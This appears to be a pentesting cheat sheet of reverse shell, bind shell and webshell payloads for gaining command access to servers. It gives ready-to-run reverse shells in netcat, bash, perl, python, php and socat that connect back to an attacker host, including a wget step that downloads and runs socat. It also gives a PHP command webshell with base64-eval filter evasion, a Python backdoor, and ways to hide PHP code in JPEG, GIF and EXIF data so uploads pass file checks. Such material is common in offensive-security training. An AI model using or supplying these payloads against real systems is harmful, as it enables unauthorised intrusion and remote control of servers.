

<!--- category: Webshell --->
<!--- id: intro --->
<!--- title: Web Shell --->
<!--- keywords:  --->
## Web Shell

Lignes de code à injecter dans des pages web pour lancer des commandes shell.



<!--- category: Webshell --->
<!--- id: ncprinciple --->
<!--- title: Principle --->
<!--- keywords:  --->
## Principle

You have found a web request that allows you to execute commands on the server, or you have managed to find out how to upload a file that can be executed.<br/>
Your goal now is to get a shell on the machine, which will allow a comfortable exploitation.<br/>
You will use the tools installed on the server (netcat, bash, php, python, perl, ...) to open a shell on the server and connect it back to your host.



<!--- category: Webshell --->
<!--- id: nc --->
<!--- title: Netcat --->
<!--- keywords:  --->
## Netcat

Netcat, is the Swiss army knife of connections between servers.<br/>
It can listen, connect and launch shells.<br/>
<br/>
Older versions had the -e or -c option to launch a shell. Recent versions do not have this option anymore for security reasons.<br/>
On Kali there is a version 1.10 in :
```
/usr/bin/nc -h
	-e shell commands : program to execute
	-c shell commands : program to execute
	-l                : listen mode
	-v                : verbose
	-p port           : local port number
```

Connect to port 3000 on 10.0.0.11 server:
```
/usr/bin/nc 10.0.0.11 3000
```




<!--- category: Webshell --->
<!--- id: ncreverse --->
<!--- title: Netcat - Reverse Shell (-e version) --->
<!--- keywords:  --->
## Netcat - Reverse Shell (-e version)

On your host, start a nc listening on 4444 port
```
nc -lvp 4444
```

On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
```
nc -e /bin/sh IPKALI 4444
```

To use a reverse shell you must have a public IP, and can't use a NAT.
Well, you can, its just little bit trickier.



<!--- category: Webshell --->
<!--- id: ncreversenoe --->
<!--- title: Netcat - Reverse Shell (without -e) --->
<!--- keywords:  --->
## Netcat - Reverse Shell (without -e)

On your host, start a nc listening on 4444 port
```
nc -lvp 4444
```

On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f
```




<!--- category: Webshell --->
<!--- id: ncupgrade --->
<!--- title: Upgrade your nc shell to a tty --->
<!--- keywords:  --->
## Upgrade your nc shell to a tty

The shell obtained with nc is basic. It is not a tty (real terminal).<br/>
Some commands like su will refuse to work.<br/>
To upgrade our shell, use python to get a tty shell:
```
python -c 'import pty; pty.spawn(&quot/bin/bash&quot)'
```




<!--- category: Webshell --->
<!--- id: ncupgrade2 --->
<!--- title: Upgrade your shell with history and completion --->
<!--- keywords:  --->
## Upgrade your shell with history and completion

The shell obtained with nc is basic. The completion with Tab, the history with arrows are not managed.<br/>
<br/>
Put the nc in the background with:
```
Ctr-Z
```

Then ask the current shell to pass the raw keystroke codes to the remote shell, and switch back to the netcat (foreground)
```
stty raw -echo
fg
```

Disclamer: Trying this in a browser will just freeze the shell. The browser also modifies the key codes. It only works in a VM



<!--- category: Webshell --->
<!--- id: ncwebfriendly --->
<!--- title: Friendly Webshell --->
<!--- keywords:  --->
## Friendly Webshell

As long as your nc is connected, you block a thread of the web server.
Depending on the configuration of the server, it can have 6, 16, 32 threads... This means as many nc in parallel before saturation.
To free the server for friends:
In the connected nc, choose a second port and launch a second netcat bindshell in the background:```
binshell: 
nohup bash -c 'while true; do nc -e /bin/bash -lvp 4445; done;' &

reverse shell: 
nohup bash -c 'bash -i >& /dev/tcp/IPKALI/4444 0>&1' &
```

The nohup command will detach the nc process from the current shell.
Do a Ctrl-C to cut the nc connection, the page with your webshell will be freed. Another user can connect.
Launch a new nc to connect to this new bindshell.



<!--- category: Webshell --->
<!--- id: ncbind --->
<!--- title: Netcat - Bind shell --->
<!--- keywords:  --->
## Netcat - Bind shell

A bind shell is useful when our host is behind a NAT.
This shell is fragile, a port scan will trigger it and close it.
Launch a shell, open a listening TCP socket on port 4444, and give access to the shell to the first one who connects.
```
nc -e /bin/sh -lvp 4444
```

Connect to the nc on the target and get the shell:
```
nc iptarget 4444
```




<!--- category: Webshell --->
<!--- id: ncbindnoe --->
<!--- title: Netcat - Bind Shell (without -e option) --->
<!--- keywords:  --->
## Netcat - Bind Shell (without -e option)

Launch a bind shell on the target host
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
```

Then connect to it
```
nc victim 4444
```




<!--- category: Webshell --->
<!--- id: socat --->
<!--- title: Shell: Socat --->
<!--- keywords:  --->
## Shell: Socat

Socat is a nc on steroids. It allows authentication, encryption of communications and port forwarding.<br/>
It is rarely found on the servers, it must be uploaded.<br/>
Start a listening socat:
```
$ socat file:`tty`,raw,echo=0 TCP-L:4444
```

Launch reverse shell back to 10.0.0.1:4444
```
$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

Automate socat upload and the reverse shell:
```
$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```




<!--- category: Webshell --->
<!--- id: pwncat --->
<!--- title: Shell: Pwncat --->
<!--- keywords:  --->
## Shell: Pwncat

Pwncat is an upgraded nc on steroids too. 
```
https://github.com/cytopia/pwncat
```




<!--- category: Webshell --->
<!--- id: bash --->
<!--- title: Reverse shell: Bash --->
<!--- keywords:  --->
## Reverse shell: Bash

Netcat and python are not installed on the server. It is still possible to launch a reverse shell in bash.<br/>
Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell on your target:
```
bash -i >& /dev/tcp/IPKALI/4444 0>&1
```




<!--- category: Webshell --->
<!--- id: perl --->
<!--- title: Reverse shell: Perl --->
<!--- keywords:  --->
## Reverse shell: Perl

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in perl on your target:
```
perl -e 'use Socket;$i="IPKALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```




<!--- category: Webshell --->
<!--- id: python --->
<!--- title: Reverse shell: Python --->
<!--- keywords:  --->
## Reverse shell: Python

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in python on your target:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IPKALI,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/bash)'
```




<!--- category: Webshell --->
<!--- id: php --->
<!--- title: Reverse shell: Php --->
<!--- keywords:  --->
## Reverse shell: Php

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in php on your target:
```
php -r '$sock=fsockopen("IPKALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```




<!--- category: Webshell --->
<!--- id: webphp --->
<!--- title: Web server: cmd.php --->
<!--- keywords:  --->
## Web server: cmd.php

If you can upload a php file to the web server, the file below will allow you to run shell commands:
```
&lt?php echo 'Shell: ';system($_GET['cmd']); ?>
```

Run 'id' on the server
```
curl http://IPSERVER/cmd.php?cmd=id
```




<!--- category: Webshell --->
<!--- id: webphp22 --->
<!--- title: Web server: cmd.php (clean html) --->
<!--- keywords:  --->
## Web server: cmd.php (clean html)

Upload the file
```
&ltpre>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>&lt/pre>
```

Run 'id' on the server
```
curl http://IPSERVER/cmd.php?cmd=id
```




<!--- category: Webshell --->
<!--- id: webphpbase64 --->
<!--- title: Web server: PHP code base64 encoded --->
<!--- keywords:  --->
## Web server: PHP code base64 encoded

Sometimes some characters like ; the & or the | are filtered. A base64 encoding allows to get out of it.<br/>
Base64 encode your command in an xterm:
```
$ printf 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f");' | base64
```

Paste de base64 encoded command in PHP reverse shell code:
```
eval(base64_decode('c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7='));
```




<!--- category: Webshell --->
<!--- id: pythonbind --->
<!--- title: Python bind shell --->
<!--- keywords:  --->
## Python bind shell

```
import sys,socket,time,re,subprocess,os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
sock.bind(('0.0.0.0',4444))
sock.listen(5)
conn,addr = sock.accept()
conn.send('== YOLO Backdoor ==\n\n>')
while 1:         
    data = conn.recv(1024)
    cmd = data.strip().split(' ')
    if cmd[0] == 'cd':
        os.chdir(cmd[1])
    elif cmd[0] in ('exit'):
        break
    else:
        conn.send(subprocess.check_output(cmd)+'\n>') 
conn.close()
sock.shutdown(socket.SHUT_RDWR)
sock.close()
```




<!--- category: Webshell --->
<!--- id: imgwebshell --->
<!--- title: File upload Webshell : Jpeg --->
<!--- keywords:  --->
## File upload Webshell : Jpeg

If you can upload a jpg file, it is possible to hide a webshell in it.<br/>  
A jpeg file is identified by its first bytes which have the value: ffd8ffe0  <br/>
To generate a file that will be identified as having a valid Jpeg header:
```
printf &quot;\xff\xd8\xff\xe0&lt?php system('id'); ?>&quot; > webshell.jpg
```

This file will be recognized as a jpg file
```
$ file webshell.jpg 
webshell.jpg: JPEG image data
```




<!--- category: Webshell --->
<!--- id: imgwebshell2 --->
<!--- title: File upload Webshell : Gif --->
<!--- keywords:  --->
## File upload Webshell : Gif

A Gif file is identified by its first bytes which have the value: GIF89a;  <br/>
To generate a file that will be identified as having a valid gif header:<br/>
```
printf &quot;GIF89a;&lt?php system('id'); ?>&quot; > webshell.gif
```

This file will be recognized as a gif file
```
$ file webshell.gif 
webshell.gif: GIF image data
```




<!--- category: Webshell --->
<!--- id: imgwebshell --->
<!--- title: File upload Webshell : Exif datas --->
<!--- keywords:  --->
## File upload Webshell : Exif datas

An image file contains a lot of information: shooting date, location, camera type...<br/>
We can inject php code in this data.
```
exiftool -Comment&equals;'&lt?php system('id'); ?>' webshell.jpg
```




<!--- category: Webshell --->
<!--- id: payloadallthethings --->
<!--- title: References: PayloadAllTheThings and PentestMonkey --->
<!--- keywords:  --->
## References: PayloadAllTheThings and PentestMonkey

You want to know more ?<br/>
Some webshells
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

Pure php Webshell: <a href=php-reverse-shell.php.txt>php-reverse-shell.php</a>
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Yop Webshell: <a href=yopwebshell.php.txt>yopwebshell.php</a><br/>
Yolo Webshell: <a href=yolowebshell.php.txt>yolowebshell.php</a>

